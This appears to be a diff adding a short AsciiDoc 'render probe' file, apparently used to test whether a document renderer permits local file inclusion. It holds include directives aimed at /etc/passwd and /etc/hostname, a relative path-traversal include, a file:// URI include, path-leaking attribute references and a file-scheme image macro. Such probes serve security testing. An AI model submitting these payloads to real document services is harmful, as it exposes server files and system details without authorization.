@@ -1,0 +1,20 @@
+= AsciiDoc render probe
+
+Baseline text CANARY-ADOC-RENDERS.
+
+Local file include attempt:
+include::/etc/passwd[]
+
+include::/etc/hostname[]
+
+Relative traversal:
+include::../../../../etc/passwd[]
+
+URI include:
+include::file:///etc/passwd[]
+
+Attribute read:
+{docdir} {docfile} {user-home}
+
+Image with file scheme:
+image::file:///etc/passwd[alt]
